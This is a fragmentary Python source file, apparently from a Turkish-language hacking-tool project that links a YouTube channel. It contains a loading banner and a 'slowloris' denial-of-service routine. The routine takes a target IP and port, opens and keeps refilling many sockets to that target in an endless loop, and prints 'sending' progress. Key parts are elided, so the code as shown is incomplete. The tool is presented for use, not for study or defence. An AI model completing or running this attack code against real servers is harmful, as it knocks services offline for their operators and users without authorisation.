...
def banner():
    init()
    i=0
    load = Spinner(colored("  Loading...  ","red"))
    while(i<5):
        i=i+1
        time.sleep(1)
        load.next()
...
Youtube: https://www.youtube.com/c/reikensecuritydevelopment
...
def slowloris():
    ...
    def main():
        ...
        ip = sys.argv[3]
        port=sys.argv[4]
        Bar = IncrementalBar(colored('Lütfen Bekleyin, {} soket hazırlanıyor...'.format(int(socket_count)),"red"),max=socket_count)
        ...
        Bar.finish()
        while True:
            print(colored("gönderiliyor... :{}".format(len(sockets)),"yellow"))
            ...
            for _ in range(socket_count - len(sockets)):
                print(colored("soket tekrar oluşturuluyor...".format("\n"),"cyan"))
                try:
                    soket=socket_info(ip,port)
                    if soket:
                        sockets.append(soket)
